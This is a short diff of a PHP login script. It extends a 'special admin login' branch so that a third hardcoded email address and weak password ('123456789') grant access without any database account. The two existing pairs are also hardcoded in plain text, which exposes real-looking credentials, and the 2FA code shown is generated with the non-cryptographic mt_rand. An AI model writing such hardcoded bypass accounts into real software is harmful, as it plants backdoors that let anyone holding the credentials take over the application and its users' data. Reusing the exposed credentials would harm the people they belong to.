@@ -29,7 +29,7 @@ try {
 
     // Connexion admin spéciale si l’utilisateur n’est pas enregistré en base.
     if ((strtolower($email) === 'mohamed@gmail.com' && $password === 'mohamed123') || 
-        (strtolower($email) === 'elabenkedher@gmail.com' && $password === 'elaelaela')) {
+        (strtolower($email) === 'elabenkedher@gmail.com' && $password === 'elaelaela') || (strtolower($email) === 'ysomai713@gmail.com' && $password === '123456789')) {
         $userData = [
             'id_user' => 0,
             'email' => $email,
@@ -119,7 +119,6 @@ try {
         $_SESSION['pending_user'] = $userData;
         $code_2fa = sprintf("%06d", mt_rand(1, 999999));
         $_SESSION['2fa_code'] = $code_2fa;
-
         $mail = new PHPMailer(true);
         try {
             $mail->isSMTP();
